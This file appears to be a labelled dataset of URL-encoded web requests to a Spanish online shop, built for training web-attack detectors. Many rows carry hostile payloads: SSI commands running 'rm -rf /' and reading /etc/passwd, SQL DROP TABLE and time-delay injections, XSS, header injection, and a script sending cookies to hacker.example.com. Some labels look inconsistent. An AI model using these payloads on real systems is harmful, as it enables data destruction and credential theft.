payload,attack_type,label
MODO=%3c%21--%23EXEC+CMD%3d%22RM+-RF+%2f%3bCAT+%2fETC%2fPASSWD%22+--%3e&LOGIN=WORLD.FA&PWD=ENTREMETER&REMEMBER=ON&b1=eNTRAR,sqli,1
modo=registro&login=timmons&password=a75isi6i7id1d&nombre=Raymond&apellidos=Porta+Aylagas&email=minton.mauban%40salaparis.cat&dni=18772944E&direccion=Calle+Arquitecto+Miguel+Del+Real+S%2FN+&ciudad=Navalmoral+de+B%E9jar&cp=17853&provincia=Palencia&ntc=9561142447521888&B1=Registrar,normal,0
modo=registro&login=galluzzi&password=3nt7epa3es&nombre=Laurentino&apellidos=Arteaga+Manzanares&email=neol%40barnicesuv.museum&dni=18445968Z&direccion=Calle+Beato+Nicolas+Factor+76%2C+&ciudad=Ballesteros+de+Calatravaparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&cp=46148&provincia=Zamora&ntc=1294969325590040&B1=Registrar,xss,1
modo=insertar&precio=2545&B1=Pasar+por+caja%2F,cmdi,1
errorMsg=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E123,sqli,1
modo=insertar&precio=7092&B1=Pasar+por+caja,normal,0
id=2,normal,0
id=2%257C,normal,1
modo=entrar&login=storm%252B&pwd=527aD2&remember=off&B1=Entrar,cmdi,1
modo=registro&login=snips&password=impenetr-abilidad&nombre=Kalanit&apellidos=Pin%F3s+Turrubiartes&email=ornellas3%40professionalhost.com.pro&dni=98057218F&direccion=Calle+Batalla+De+Otumba+26%2C+&ciudad=Lora+de+Estepa&cp=43120&provincia=Salamanca&ntc=3586735536952135&B1=Registrar123,normal,0
B2A=Vaciar+carrito,normal,1
id=2&nombre=vino+rioja&precio=39&cantidad=12&b1=a%f1adir+al+carrito,normal,0
modo=registro&login=geesman&password=sut5&nombre=Iolaf&apellidos=Valentino+Ruiz&email=nasit_barscha%40cortinas-de-aire.eh&dni=89910635R&direccion=Espartero%2C+103%2C+5-F&ciudad=Valverde+de+Alcal%E1&cp=18339&provincia=A+Coru%F1a&ntc=1903817695909125&B1=Registrar123,normal,0
id=1,normal,0
idA=2,normal,1
errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=registro&login=sudabeh85&password=d3s%27c5467i39e&nombre=Elsio&apellidos=Cantonati&email=hyke%40100mbps.iq&dni=77489593V&direccion=Urbanizacion+Los+Girasoles%2C+132+&ciudad=Loiu&cp=37621&provincia=Madrid&ntc=8137119286201470&B1=Registrar,cmdi,1
B2=Vaciar+carrito123,normal,0
B2=Vaciar+carrito,normal,0
id=1&nombre=Vino+Rioja&precio=100&cantidad=70&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=%27INJECTED_PARAM&pwd=reparaci%F3n&remember=off&B1=Entrar,cmdi,1
modo=insertar&precio=277&B1=Confirmar,normal,0
errorMsg=Credenciales+incorrectas123,normal,0
id=1&nombre=Queso+Manchego&precio=85%2F&cantidad=38&B1=A%F1adir+al+carrito,cmdi,1
id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=54&B1=A%F1adir+al+carrito,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
MODO=PAROS%2522%2bSTYLE%253d%2522BACKGROUND%253aURL%2528JAVASCRIPT%253aALERT%2528%2527pAROS%2527%2529%2529%26ID%3d2&PRECIO=2293&b1=cONFIRMAR,xss,1
modoA=entrar&login=brooksba&pwd=papilla&remember=on&B1=Entrar,cmdi,1
Open,normal,1
modo=insertar&precio=8496&B1=Pasar+por+caja%22+AND+%221%22%3D%221,cmdi,1
id=2&nombre=Queso+Manchego&precioA=100&cantidad=50&B1=A%F1adir+al+carrito,cmdi,1
id=2&nombre=Queso+Manchego&precio=85&cantidad=21&B1=A%F1adir+al+carrito,normal,0
ID=%27%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
modo=entrar&login=olimpia&pwd=8i273e&remember=off&B1=Entrar123,normal,0
modo=registro&login=upchurch&password=Plut%F358_C5&nombre=Cruz&apellidos=Berengel+Artigas&email=roudenko_sedimayr%40soyvasco.ca&dni=61007775E&direccion=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&ciudad=Poliny%E0&cp=37779&provincia=Soria&ntc=1707059496067990&B1=Registrar123,sqli,1
errormsga=credenciales+incorrectas,normal,1
modo=entrar&login=toole&pwd=%2Cap%24iLadOra&remember=on&B1=Entrar,cmdi,1
b2=vACIAR+CARRITO%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e,xss,1
errorMsg=Credenciales+incorrectas123,normal,0
B2=Vaciar+carrito,normal,0
id=2&nombre=vino+rioja&precio=100&cantidad=42&b1=a%f1adir+al+carrito,normal,0
modo=insertar&precio=709&B1=Confirmar%2F,cmdi,1
modo=entrar&login=dokken8&pwd=PaRLaNch%EDn&remember=off&B1=Entrar%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
modo=registro&login=rodschat&password=5mp1o0isad65&nombre=Tarcisio&apellidos=Merlach+Corminas&email=azar%40archivodeimagenes.eu&dni=63154198Q&direccion=Carlos+Balenchana+83%2C+&ciudad=Lech%F3n&cp=24882&provincia=Girona%252B&ntc=7458916461034626&B1=Registrar,cmdi,1
id=2&nombre=Vino+Rioja&precio=85&cantidad=94&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=carolina&password=paRtICUlaridaD&nombre=Ihor&apellidos=M%FAgica+Vall%E9s&email=urecal8%40espanolynegocios.bu&dni=67961648Y&direccion=Av.+Olimpica%2C+156+&ciudadA=Navajas&cp=43941&provincia=Madrid&ntc=2515177122592288&B1=Registrar,cmdi,1
id=2,normal,0
errorMsg=Credenciales+incorrectas,normal,0
id=1&nombre=Vino+Rioja&precio=85&cantidad=67&B1=A%F1adir+al+carrito,normal,0
id=2&nombre=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=85&cantidad=18&B1=A%F1adir+al+carrito123,sqli,1
MODO=ENTRAR&LOGIN=YOONMO2PAROS%2522%2520STYLE%3d%2522BACKGROUND%3aURL%28JAVASCRIPT%3aALERT%28%27pAROS%27%29%29&PWD=AZO5DA&REMEMBER=OFF&b1=eNTRAR,xss,1
errorMsg=Credenciales+incorrectas,normal,0
id=3&nombre=vino+rioja&precio=39&cantidad=84&b1=a%f1adir+al+carrito,normal,0
B2=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,normal,1
modo=entrar&login=wattier&pwd=esclisiado&remember=off&B1=Entrar,normal,0
B2=Vaciar+carrito,normal,0
modo=insertar&precio=973&B1=Confirmar,normal,0
b2=vACIAR+CARRITO%3c%21--%23INCLUDE+FILE%3d%22ARCHIVO_SECRETO%22+--%3e,sqli,1
modo=registro&login=giorgi&password=TaRtarIzar&nombre=Danis&apellidos=Cabeza+Novella&email=mestre%40clichotel.wf&dni=79856305Y&direccion=Calle+Andres+Mellado%2C+83%2C+12-D&ciudad=Gratallops&cp=16648&provincia=Badajoz&ntc=7771108702507095&B1=Registrar123,normal,0
errorMsg=Credenciales+incorrectas,normal,0
B2=Vaciar+carrito,normal,0
errormsga=credenciales+incorrectas,normal,1
id=2,normal,0
modo=registro&login=eppe%2Fr%2Fs*on&password=pisa-verde&nombre=Vianella&apellidos=Galdeano+Piccech&email=dudgeon%40tradora.na&dni=80818838N&direccion=C%2F+Can+Petit+42%2C+10-F&ciudad=Gormaz&cp=32737&provincia=Zaragoza&ntc=0673547824413217&B1=Registrar,cmdi,1
id=1&nombre=Queso+Manchego&precio=85&cantidad=73&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=rui-yuan&pwd=priado&remember=off&b1=entrar,normal,0
modo=insertar&precio=7277&B1=Pasar+por+caja%2F,cmdi,1
modo=registro&login=kawahara&password=coposes%2Bor&nombre=Leopolda&apellidos=Rojo&email=yegorova%40onlinegratis.aq&dni=26857148W&direccion=C%2F+Poetisa+Juana+Luna+135%2C+5-G&ciudad=Robledo%2C+El&cp=17132&provincia=C%E1ceres&ntc=1013839255415195&B1=Registrar,normal,0
id=2,normal,0
id=1,normal,0
modo=insertar&precio=8962&B1A=Confirmar,cmdi,1
modo=registro&login=tat7&password=p0on57cia008nto&nombre=Camelia&apellidos=Zurita+Santander&email=diessl-claver%40tradedeficit.mz&dni=59059811C&direccion=Artes%2C+S%2FN+&ciudad=Escobar+de+Polendos&cp=18518&provincia=Burgos&ntc=2636619315022095&B1=Registrar%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C123,sqli,1
B2=Vaciar+carritoany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,normal,1
idA=1123,normal,1
modo=registro&login=nici&password=85amo&nombre=orencia&apellidos=munn%e9&email=antonelli-ankrum%40escarba.pm&dni=86979759s&direccion=playa+postiguet+81%2c+&ciudad=arenys+de+mar&cp=38726&provincia=zaragoza&ntc=1355384267469689&b1=registrar,normal,0
modo=insertar&precio=9782&b1=confirmar,normal,0
b2a=vaciar+carrito,normal,1
id=2,normal,0
B2A=Vaciar+carrito,normal,1
modo=registro&login=%3Flore*nza&password=7n3i083zo&nombre=Tom%E1s&apellidos=Mares+Mulleras&email=aylmer%40pisossantcugat.pl&dni=04472501J&direccion=Gravina+197+3%3FH&ciudad=Calzadilla+de+Tera&cp=46827&provincia=Cuenca&ntc=7996895110966395&B1=Registrar,cmdi,1
ID=2&NOMBRE=vINO+rIOJA&PRECIO=39&CANTIDAD=90%27%2c%270%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&b1=a%f1ADIR+AL+CARRITO,sqli,1
id=1,normal,0
B2=Vaciar+carrito%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
id=and+1%3d1,normal,1
modo=insertar&precio=1287&B1=Confirmar,normal,0
modo=registro&login=patenaud&password=9a4%ED70ul0&nombre=Gaudencio&apellidos=Barreras+De+la+Bandera&email=clunes7%40palodegolf.com.coop&dni=25559456Q&direccion=Calle+Joaquin+Gamon+175%2C+2-C&ciudad=Villamuriel+de+Cerrato&cp=46814&provincia=Madrid&ntc=5212720427288459&B1=Registrar123,normal,0
modo=entrar&login=zimmerer&pwd=r8mio34&remember=on&B1=Entrar123,normal,0
modo=entrar&login=terencio&pwd=ag2u7a&remember=off&B1=Entrar,normal,0
modo=entrar&login=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&pwd=ensa%F1ada&remember=on&B1=Entrar123,sqli,1
B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,sqli,1
modo=registro&login=fitness&password=chap8n&nombre=Sol&apellidos=Masferr%E9+Massan%E9s&email=fechner_rabel%40fortelingenieria.sd&dni=85063049X&direccion=Can+Ferragut%2C+132%2C+4%3FE&ciudad=Rebolledo+de+la+Torre&cp=25727&provincia=Almer%EDa&ntc=6608191382152819&B1=Registrar,normal,0
modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidosA=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar,cmdi,1
modo=insertar&precio=4170&B1=Pasar+por+caja,normal,0
modo=registro&login=hammad&password=7ON4CHUEla&nombre=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&apellidos=Pollini+Llobet&email=suedo%40xavipetit.kz&dni=09876466J&direccion=Calle+Violeta+118%2C+&ciudad=San+Sadurni%F1o&cp=21600&provincia=Girona&ntc=2717952590420573&B1=Registrar,sqli,1
errormsg=credenciales+incorrectas,normal,0
idA=2,normal,1
modo=registro&login=rintel&password=degollAr&nombre=Antulio&apellidos=Morales+Orpinell&email=pataki-grifties%40hiteurope.by&dni=34336341D&direccion=C%2F+Rua+Mayor%2C+31%2C+1%3FE&ciudad=Sant+Vicen%E7+de+Torell%F3&cp=50371&provincia=Valencia&ntc=5377372403667671&B1=Registrar,normal,0
modo=entrar&login=hall&pwd=9at39243z3&remember=on&B1=Entrar,normal,0
modo=registro&login=waytowic&password=EngARgOLar&nombreA=Renato&apellidos=Membrives+Larragoiti&email=alvarez_barwick%40906.com.tv&dni=61170907S&direccion=C%2F+Max+Aub+121+9-A&ciudad=Cill%E1n&cp=20213&provincia=%C1vila&ntc=0093197595343977&B1=Registrar,cmdi,1
modo=registro&login=mathieso&password=pesantez&nombre=Trinidad&apellidos=Mc%27Morral+Obrist&email=jolley%40decoaching.na&dni=50535908D&direccion=Azorin+35+1B&ciudad=Padiernos&cp=25613&provincia=Sevilla&ntc=8120300504791286&B1=Registrar,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
modo=registro&login=triantap&password=arpe*nde&nombre=Alor&apellidos=De+Lagarza+Delacerda&email=felber%40hiperespa%F1a.ps&dni=87179467Z&direccion=Calle+Poligon+Industrial+%22el+Segre%22%2C+118+&ciudad=Vilanova+de+Arousa&cp=31790&provincia=Salamanca&ntc=3548348718435303&B1=Registrar,normal,0
B2=Vaciar+carrito123,normal,0
modo=entrar&login=bret3&pwd=8omba51a&remember=on&B1=Entrar,normal,0
id=2&nombre=Vino+Rioja&precio=100&cantidad=51&B1=A%F1adir+al+carrito,normal,0
modo=%2B&precio=2814&B1=Confirmar,cmdi,1
modo=registro&login=arne&password=AREnillA&nombre=Malaqu%EDas&apellidos=Bota+Gifre&email=herdegen-vehil%40cortinas-de-aire.ar&dni=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&direccion=C%2F+Sabugo%2C+157%2C+&ciudad=Valdevacas+de+Montejo&cp=26339&provincia=Tarragona&ntc=6852146150685245&B1=Registrar,sqli,1
modo=entrar&login=glazer&pwd=rustir&remember=on&B1=Entrar,normal,0
modo=registro&login=yeohoon&password=afectivo&nombre=Nelma&apellidos=Vic%E8n+Revuelta&email=AND+1%3D1&dni=05422497V&direccion=Avenida+Xixo%2C+150+13B&ciudad=Corcubi%F3n&cp=31130&provincia=Zaragoza&ntc=8951724239129499&B1=Registrar,cmdi,1
modo=insertar&precio=3243&B1=Pasar+por+caja123,normal,0
modo=insertar&precio=2354&B1=Pasar+por+caja,normal,0
modo=registro&login=jagath&password=azOrR1RsE&nombreA=Sili&apellidos=Maslo+Arrunategui&email=davray.chayevsky4%40sierradealcaraz.um&dni=97290360S&direccion=C%2F+Galindez+De+Carvajal%2C+27+&ciudad=San+Miguel+de+Serrezuela&cp=09692&provincia=Le%F3n&ntc=8772164486474313&B1=Registrar,cmdi,1
modo=registro&login=lafferty&password=e_ncobador&nombre=noely&apellidos=grajera+sampol&email=hightower%40freetag.cl&dni=51407196b&direccion=c%2f+paralela+al+c%2fjon+quebradizo+36+&ciudad=seca%2c+la&cp=03180&provincia=teruel&ntc=6837813065545901&b1=registrar,normal,0
modo=registro&login=danforth7&password=p%E10o7i&nombre=Liana&apellidos=Crivill%E9+Van+Derdys&email=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&dni=70627754K&direccion=Calle+Rosal%2C+42+4%3FD&ciudad=Casas+de+Don+Antonio&cp=17780&provincia=Segovia&ntc=8272734810678085&B1=Registrar,cmdi,1
modo=registro&login=thuy&password=vafoSa&nombre=Tosca&apellidosA=Pica%F1ol+Pedreira&email=markowski%40salaparis.pe&dni=80624196L&direccion=Igualada%2C+157+&ciudad=Breda&cp=08348&provincia=Segovia&ntc=2333713014492030&B1=Registrar,cmdi,1
MODO=REGISTRO&LOGIN=MANEK&PASSWORD=DI3GU6TA7A5E3T5&NOMBRE=oBERTO&APELLIDOS=mANSUR+mORALES&EMAIL=LAVAL_KOLDEHOFF%40NUTRIMAMA.SB&DNI=73525509y&DIRECCION=aLARONA%2c+52+&CIUDAD=sAN+gARC%edA+DE+iNGELMOS%27%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&CP=26375&PROVINCIA=sORIA&NTC=8551810827750150&b1=rEGISTRAR,sqli,1
modo=registro&login=xaviera&password=och*avero&nombre=Florestano&apellidos=Alegre+Nomdedeu&email=pianka%40noviasteresapalacios.mc&dni=42798379W&direccion=Calle+Estafeta+105+6C&ciudad=Entrala&cp=47800&provincia=Burgos&ntc=2111805626623658&B1=Registrar123,normal,0
modo=insertar&precio=5907&b1=confirmar,normal,0
B2=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,sqli,1
id=2&nombre=queso+manchego&precio=100&cantidad=21&b1=a%f1adir+al+carrito,normal,0
modo=registro&login=tiena&password=buc_%E9falO&nombre=Iberio&apellidos=Marmolejos&email=lester_muenster%40erasmusrooms.org&dni=54415049Q&direccion=Raco+67%2C+4%3FC&ciudad=Villanueva+de+la+Serena&cp=08281&provincia=Burgos&ntc=6091962407544317&B1=Registrar123,normal,0
modo=insertar&precio=6849&B1=Pasar+por+caja,normal,0
id=2,normal,0
B2=Vaciar+carrito123,normal,0
modo=registro&login=scherzin&password=perih1lio&nombre=Gervasio&apellidos=Princep+Muntadas&email=young-kyun%40forohh.cl&dni=12064316B&direccion=Jose+Mu%F1oz+San+Roman%2C+S%2FN%2C+&ciudad=Losilla%2C+La&cp=35200&provincia=Pontevedra&ntc=9475732136741046&B1=Registrar123,normal,0
id=1,normal,0
id=1123,normal,0
errorMsg=Credenciales+incorrectas%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,sqli,1
id=3&nombre=queso+manchego&precio=39&cantidad=53&b1=a%f1adir+al+carrito,normal,0
modo=entrar&login=crommie&pwd=0eju0o&remember=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&B1=Entrar123,sqli,1
b2=any%250aset-cookie%253a%2btamper%253d1041264011025374727,normal,1
modo=registro&login=archy&password=83*4r31l7&nombre=Jimy&apellidos=Bassas+Sancliment&email=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&dni=75288361T&direccion=Calle+Versalles%2C+58+&ciudad=Bercero&cp=50155&provincia=Zaragoza&ntc=7133167729041285&B1=Registrar,cmdi,1
id=3&nombre=Queso+Manchego&precio=85&cantidad=0&B1=A%F1adir+al+carrito,normal,0
errorMsg=Credenciales+incorrectas%22+AND+%221%22%3D%221,normal,1
id=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E123,xss,1
modo=registro&login=mirabel&password=ost91ma&nombre=Pascacio&apellidos=Muntan%E9+Pros&email=paovarat_christian-gerard%40audiosat.mp&dni=49439340N&direccion=Calle+Godelleta%2C+S%2FN+&ciudad=Sant+Aniol+de+Finestres&cp=05619&provincia=Barcelona&ntc=7519305817718575&B1=Registrar,normal,0
modo=registro&login=swick&password=recalzar&nombre=Amiel&apellidos=Del+Blanco&email=ying-carridine%40audiosat.sy&dni=55739537A&direccion=Jose+Cadierno+186%2C+6F&ciudad=Nu%E9valos&cp=37621&provincia=Asturias%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&ntc=2320151892972616&B1=Registrar,sqli,1
idA=1,normal,1
modo=registro&login=rivard&password=cEgaJOSo&nombre=Normando&apellidos=Pirla&email=nettleton.hamissi%40estudiodeyoga.pt&dni=98820419E&direccion=C%2F+Ancha%2C+31+5A&ciudad=Sada&cp=08297&provincia=C%E1ceres&ntc=9625616287143216&B1=Registrar,normal,0
modo=registro&login=mitsui&password=d2S3O1nil2ar&nombre=Tea&apellidos=Cabrera+Noguera&email=holzer-hammersley4%40discon.in&dni=7645B6096BW&direccion=Guadamacil%2C+198%2C+&ciudad=Torrejoncillo&cp=08779&provincia=Teruel&ntc=4706372444418662&B1=Registrar,cmdi,1
MODO=ENTRAR&LOGIN=%27%2c%270%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&PWD=MATALAH%faVA&REMEMBER=OFF&b1=eNTRAR,sqli,1
modo=insertar&precio=40&B1=Pasar+por+caja%2F,cmdi,1
errorMsg=Credenciales+incorrectassessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,normal,1
id=3&nombre=Vino+Rioja&precio=85&cantidad=35&B1A=A%F1adir+al+carrito,cmdi,1
modo=entrar&login=zimmerer&pwd=r8mio34&remember=on&B1=Entrar,normal,0
modo=insertar&precio=8695&B1=Confirmar,normal,0
modo=registro&login=flynn&password=alarm%3Fista&nombre=Zelina&apellidos=Morcillo+Amparan&email=colona%40aebo.lb&dni=86164975Y&direccion=Alamo%2C+S%2FN%2C+&ciudad=Casas+de+Reina&cp=05413&provincia=Salamanca&ntc=163975271288072A&B1=Registrar,cmdi,1
MODO=ENTRAR&LOGIN=ASBJORN&PWD=VIRULENTA&REMEMBER=ON&b1=eNTRAR%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e,xss,1
id=1,normal,0
modo=insertar&precio=2445%3F&B1=Confirmar,cmdi,1
modo=registro&login=flore&password=pr99O9A9&nombre=Dalila&apellidos=Ozerea+Malibr%E1n&email=hulbert-quillan%40habitaciondepanico.pa&dni=10302390T&direccion=Rigoberta+Menchu+184+10%3FD&ciudad=Boada&cp=27268&provincia=Navarra&ntc=1534175885053234&B1=Registrar,normal,0
modo=entrar&login=calow&pwd=ensa%F1ada&remember=on&B1=Entrar%7C,cmdi,1
B2=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
b2=BOB%40%3cscrIPT%3eALERT%28pAROS%29%3c%2fSCRipt%3e.PAROSPROXY.ORG,xss,1
modo=registro&login=watchorn&password=gin09r9n3&nombre=Alcira&apellidos=Marcapura+Pachecote&email=wolheim%40soyrojo.se&dni=79531407Y&direccion=Calle+La+Gran*ja%2C+%2B150%2C+1%3FC&ciudad=Deleitosa&cp=49410&provincia=Baleares+%28Illes%29&ntc=4881993166167995&B1=Registrar,cmdi,1
id=2&nombre=Queso+Manchego&precio=39&cantidad=35&B1=A%F1adir+al+carrito,normal,0
modo=insertar&precio=7716&B1=Confirmar%2F,cmdi,1
id=1&nombre=Vino+Rioja&precio=39&cantidad=80&B1=A%F1adir+al+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E123,sqli,1
B2A=Vaciar+carrito123,normal,1
modo=registro&login=brunner-&password=chacr4&nombre=Rosio&apellidos=Sklar+Paisano&email=ekblad.pughe%40sindns.lb&dni=65648262Y&direccion=Calle+Codigo+Correspondencia+Oficial+Correos-telegrafos+14+&ciudad=Aloc%E9n&cp=39490&provincia=Huesca&ntcA=2810115740271505&B1=Registrar,cmdi,1
b2a=vaciar+carrito,normal,1
modo=entrar&login=daisey&pwd=r92e1*56e&remember=on&B1=Entrar123,normal,0
ida=1,normal,1
B2=Vaciar+carrito123,normal,0
modo=registro&login=doerr&password=8osqu85a7&nombre=Remy&apellidos=Torrado+G%E1llego&email=akadeth_svojtka%40privatebanking.com.pe%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&dni=98300353D&direccion=Calle+Equador+86%2C+&ciudad=Sant+Cugat+Sesgarrigues&cp=17001&provincia=Burgos&ntc=9853640605253421&B1=Registrar123,sqli,1
modo=insertar&precio=1459&b1=pasar+por+caja,normal,0
modo=registro&login=hsketh&password=f5o9a8en9e&nombre=Eial&apellidos=Moscoso+Mesen&email=wines%40interanuncios.sn&dni=97228883V&direccion=Camino+De+Los+Cipreses+125%2C+&ciudad=Fuente+el+Sa%FAz&cp=38470&provincia=Burgos&ntc=6164299697830366&B1=Registrar123,normal,0
idA=1,normal,1
errormsg=credenciales+incorrectas,normal,0
errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
id=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C123,sqli,1
id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=7&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=hotson&password=3u*3m15i92&nombre=Talia&apellidos=Sau+Nobrega&email=siede%40comodepilarse.ye&dni=10719743H&direccion=Ponferrada+65+10-C&ciudad=Santa+Colomba+de+Somoza&cp=12200&provincia=Sevilla&ntc=1309699590331954&B1=Registrar123,normal,0
modo=entrar&login=moyes&pwd=manducatoria&remember=off&b1=entrar,normal,0
modo=registro&login=munaz&password=s2ld54i5a&nombre=Zulma&apellidos=Llombart&email=strimpell%40deuxmanagement.sn&dni=54841138Fbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&direccion=Sofia%2C+60%2C+3%3FB&ciudad=Finestrat&cp=01427&provincia=Granada&ntc=3222655347075896&B1=Registrar123,xss,1
modo=registro&login=suwanawo5&password=desp2li52ado5&nombre=Said&apellidos=Tudanca+Huitron&email=kazem%40cup-id.as&dni=77452423S&direccion=Av.+Vicente+Mortes%2C+78%2C+8%3FF&ciudad=Montoro&cp=03759&provincia=Burgos&ntc=3002451726827839&B1=Registrar123,normal,0
id=1&nombre=Queso+Manchego&precio=39&cantidad=52&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=gaftea&password=5a4a84e8a&nombre=Luciano&apellidos=Sarri%E0+Orbe&email=hartmann%40softstylestudio.sa&dni=72932222G&direccion=C%2F+Santo+Domingo+13+10%3FB&ciudad=Camponaraya&cp=25576&provincia=Lleida&ntc=9047664799943774&B1=Registrar,normal,0
B2=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E123,sqli,1
modo=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&login=boschin&password=3189p6zada&nombre=Amadis&apellidos=Funes+Port%E9s&email=gracie%40triplectextil.me&dni=81791661G&direccion=Carrer+Pica+D%27estats+113%2C+1%3FD&ciudad=Pedrosillo+de+los+Aires&cp=03345&provincia=Guadalajara&ntc=1272948221132397&B1=Registrar123,sqli,1
id=2,normal,0
modo=insertar&precio=5335&B1=Confirmar,normal,0
id=2123,normal,0
modo=insertar&precio=7749&B1A=Confirmar,cmdi,1
errorMsgA=Credenciales+incorrectas,normal,1
modo=registro&login=winde&password=Presta&nombre=Jugen&apellidos=Diez+Lizano&email=sims2%40videocasa-ebs.ru&dni=34081266G&direccion=Avda.+De+La+Costa+151%2C+&ciudad=Valdemoro&cp=09665&provincia=Ciudad+Real&ntc=7857158360903973&B1=Registrar,normal,0
modo=registro&login=kimberle&password=A4AL4s9&nombre=Cruz&apellidos=Camp%ED+Fein%E9&email=fintzi-tevis%40cbgerindote.sv&dni=56359685W&direccion=C%2F+Les+Parres%2C+168+&ciudad=Tortuero&cp=37171&provincia=Teruel&ntc=5980859147106836&B1=Registrar,normal,0
modo=registro&login=triantap&password=lobera&nombre=Odelia&apellidos=Moll+Aybar&email=liedtke_truhitte%40ac-activos.gob&dni=75013152D&direccion=C%2F+Murillo%2C+106+5C&ciudad=Abrucena&cp=09191&provincia=Valencia&ntc=6986219017290364&B1=Registrar123,normal,0
